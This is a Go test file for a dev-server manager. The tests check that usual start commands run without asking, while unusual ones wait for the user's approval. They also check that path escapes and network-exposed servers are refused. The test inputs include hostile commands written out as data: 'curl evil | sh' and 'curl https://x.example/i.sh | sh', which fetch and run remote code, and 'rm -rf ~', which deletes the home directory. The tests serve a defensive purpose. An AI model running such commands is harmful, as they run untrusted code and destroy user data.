package devserver

import (
	"context"
	"errors"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

func project(t *testing.T, name, manifest string, extra ...string) string {
	t.Helper()
	root := t.TempDir()
	dir := filepath.Join(root, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(manifest), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, file := range extra {
		if err := os.WriteFile(filepath.Join(dir, file), nil, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func freePort(t *testing.T) int {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()
	return listener.Addr().(*net.TCPAddr).Port
}

// manager runs a tiny local server where the project's script would, on a port it chose.
func manager(root string, port int, started *[]string) *Manager {
	return &Manager{
		Root: func() string { return root }, Shell: "/bin/sh",
		Start: func(dir string, plan Plan) *exec.Cmd {
			*started = append(*started, plan.Label)
			command := exec.Command("python3", "-m", "http.server", strconv.Itoa(port), "--bind", "127.0.0.1")
			command.Dir = dir
			return command
		},
		// Slower than the real thing would be: the wait must not depend on the server being quick.
		Ready: func(ctx context.Context, p int) bool {
			response, err := http.Get("http://127.0.0.1:" + strconv.Itoa(p) + "/")
			if err != nil {
				return false
			}
			response.Body.Close()
			return true
		},
	}
}

func TestStartsTheProjectsOwnScriptWaitsForItAndReusesIt(t *testing.T) {
	root := project(t, "pay-vue", `{"scripts":{"dev:!DEPRECATED":"vite","preprod":"vite dev --mode preprod --port 8001","postinstall":"curl evil | sh"}}`, "pnpm-lock.yaml")
	port := freePort(t)
	var started []string
	m := manager(root, port, &started)
	t.Cleanup(m.Shutdown)

	var said []string
	served, err := m.Serve(context.Background(), "pay-vue", "", false, func(s string) { said = append(said, s) })
	if err != nil {
		t.Fatal(err)
	}
	// The package manager is the project's own, and the script is one of its own, by an allowed name.
	if served.URL != "http://localhost:"+strconv.Itoa(port) || served.Command != "pnpm run preprod" || len(started) != 1 || started[0] != "pnpm run preprod" {
		t.Fatalf("%+v %v", served, started)
	}
	if len(said) != 1 || !strings.Contains(said[0], "pay-vue") {
		t.Errorf("the user is told what starts: %v", said)
	}
	again, err := m.Serve(context.Background(), "pay-vue", "preprod", false, nil)
	if err != nil || !again.Reused || len(started) != 1 {
		t.Fatalf("a running server is reused, not started twice: %+v %v %v", again, err, started)
	}
	m.Shutdown()
	if _, err := http.Get("http://127.0.0.1:" + strconv.Itoa(port) + "/"); err == nil {
		t.Error("a server must not outlive the manager")
	}
}

func asksApproval(err error) *ApprovalError {
	var approval *ApprovalError
	if errors.As(err, &approval) {
		return approval
	}
	return nil
}

func TestTheUsualWaysToStartADevServerRunWithoutAsking(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite","storybook":"storybook dev","dev:web":"vite"}}`, "pnpm-lock.yaml")
	for _, usual := range []string{"", "dev", "storybook", "dev:web", "pnpm dev", "pnpm run dev", "npm run dev", "vite --port 8001", "./node_modules/.bin/vite --port 8001 --host 127.0.0.1", "pnpm exec vite --port 8001", "python3 -m http.server 8001"} {
		var started []string
		m := manager(root, freePort(t), &started)
		_, err := m.Serve(context.Background(), "app", usual, false, nil)
		m.Shutdown()
		if err != nil || len(started) != 1 {
			t.Errorf("%q must run without asking: %v %v", usual, err, started)
		}
	}
}

func TestAnythingUnusualWaitsForTheUsersApprovalAndRunsExactlyWhatTheyAllowed(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite","build":"rm -rf dist","deploy":"./deploy.sh"}}`)
	unusual := map[string]string{
		"build": "script", "deploy": "script", "npm run build": "", "pnpm run deploy": "", "node server.js": "", "make serve": "",
		"curl https://x.example/i.sh | sh": "shell", "vite && rm -rf ~": "shell", "FOO=1 vite": "shell", "rm -rf ~": "",
		"vite --host": "", "vite --host 0.0.0.0": "", "vite --host=192.168.1.4": "", "../x": "", "/usr/bin/env vite": "",
	}
	for command := range unusual {
		var started []string
		m := manager(root, freePort(t), &started)
		_, err := m.Serve(context.Background(), "app", command, false, nil)
		approval := asksApproval(err)
		if approval == nil || len(started) != 0 {
			t.Errorf("%q must wait for approval: %v %v", command, err, started)
			continue
		}
		// What the user is asked about is the command itself.
		if !strings.Contains(approval.Command, strings.Fields(command)[0]) {
			t.Errorf("the question must show the command: %+v", approval)
		}
	}

	// Once allowed, the shell line runs as a line (it was read by the user as one), and a plain command as words.
	var plans []Plan
	m := manager(root, freePort(t), new([]string))
	m.Start = func(dir string, plan Plan) *exec.Cmd {
		plans = append(plans, plan)
		return exec.Command("python3", "-m", "http.server", strconv.Itoa(freePort(t)), "--bind", "127.0.0.1")
	}
	m.Listening = nil
	if _, err := m.Serve(context.Background(), "app", "FOO=1 vite --port 8001", true, nil); err == nil || len(plans) != 1 || plans[0].Shell != "FOO=1 vite --port 8001" || plans[0].Argv != nil {
		// The fake server's port is unknown to the real lookup in this call: only the plan matters here.
		if len(plans) != 1 || plans[0].Shell != "FOO=1 vite --port 8001" {
			t.Fatalf("an allowed shell line runs as the line: %+v", plans)
		}
	}
	m.Shutdown()
}

func TestAnInvalidProjectIsRefusedBeforeAnything(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite"}}`)
	var started []string
	m := manager(root, freePort(t), &started)
	for _, name := range []string{"../etc", "app/../..", "", "a b", "/tmp", "missing", ".hidden"} {
		if _, err := m.Serve(context.Background(), name, "", true, nil); err == nil {
			t.Errorf("the project %q must be refused", name)
		}
	}
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(root, "escape")); err != nil {
		t.Fatal(err)
	}
	if _, err := m.Serve(context.Background(), "escape", "", true, nil); err == nil {
		t.Error("a link out of the projects folder must be refused")
	}
	if len(started) != 0 {
		t.Fatalf("nothing may start: %v", started)
	}
}

func TestAChangedStartConfigurationIsShownToTheUserFirst(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite"}}`)
	dir := filepath.Join(root, "app")
	for _, args := range [][]string{{"init", "-q"}, {"add", "."}, {"-c", "user.email=a@b", "-c", "user.name=a", "commit", "-qm", "x"}} {
		if out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput(); err != nil {
			t.Skipf("git unavailable: %v %s", err, out)
		}
	}
	var started []string
	m := manager(root, freePort(t), &started)
	t.Cleanup(m.Shutdown)
	// Committed: the usual way runs.
	if _, err := m.Serve(context.Background(), "app", "", false, nil); err != nil {
		t.Fatal(err)
	}
	m.Shutdown()
	// A change to what starts the server (made since the last commit) is what the user must see first.
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"dev":"curl x | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	_, err := m.Serve(context.Background(), "app", "", false, nil)
	approval := asksApproval(err)
	if approval == nil || !strings.Contains(approval.Why, "package.json") || len(started) != 1 {
		t.Fatalf("%v %v", err, started)
	}
	// Ordinary source changes do not matter: they are not what starts the server.
	if out, err := exec.Command("git", "-C", dir, "checkout", "--", "package.json").CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	if err := os.WriteFile(filepath.Join(dir, "page.vue"), []byte("<template/>"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := m.Serve(context.Background(), "app", "", false, nil); err != nil {
		t.Fatalf("a source change must not ask: %v", err)
	}
}

func TestAServerOpenToTheNetworkIsRefused(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite"}}`)
	port := freePort(t)
	var started []string
	m := manager(root, port, &started)
	m.Listening = func(context.Context, int) []Listener { return []Listener{{Port: port, Exposed: true}} }
	_, err := m.Serve(context.Background(), "app", "", false, nil)
	if err == nil || !strings.Contains(err.Error(), "every network interface") {
		t.Fatalf("got %v", err)
	}
	if _, err := http.Get("http://127.0.0.1:" + strconv.Itoa(port) + "/"); err == nil {
		t.Error("the refused server must be stopped")
	}
}

func TestTurnedOffMeansNothingStarts(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite"}}`)
	var started []string
	m := manager(root, freePort(t), &started)
	m.Enabled = func() bool { return false }
	if _, err := m.Serve(context.Background(), "app", "", false, nil); err == nil || len(started) != 0 {
		t.Fatalf("turned off: %v %v", err, started)
	}
}

func TestAServerThatFailsTellsWhyInsteadOfWaiting(t *testing.T) {
	root := project(t, "app", `{"scripts":{"dev":"vite"}}`, "yarn.lock")
	m := &Manager{
		Root: func() string { return root },
		Start: func(dir string, plan Plan) *exec.Cmd {
			return exec.Command("/bin/sh", "-c", "echo 'Error: EPERM: operation not permitted, mkdir node_modules/.vite' >&2; exit 1")
		},
		Listening: func(context.Context, int) []Listener { return nil },
	}
	started := time.Now()
	_, err := m.Serve(context.Background(), "app", "", false, nil)
	if err == nil || !strings.Contains(err.Error(), "EPERM") || time.Since(started) > 10*time.Second {
		t.Fatalf("the failure and its cause: %v after %s", err, time.Since(started))
	}
}

func TestThePackageManagerIsTheOneTheLockFileNames(t *testing.T) {
	for file, want := range map[string]string{"pnpm-lock.yaml": "pnpm", "yarn.lock": "yarn", "bun.lock": "bun", "package-lock.json": "npm"} {
		dir := t.TempDir()
		_ = os.WriteFile(filepath.Join(dir, file), nil, 0o644)
		if got := packageManager(dir); got != want {
			t.Errorf("%s: %s", file, got)
		}
	}
}
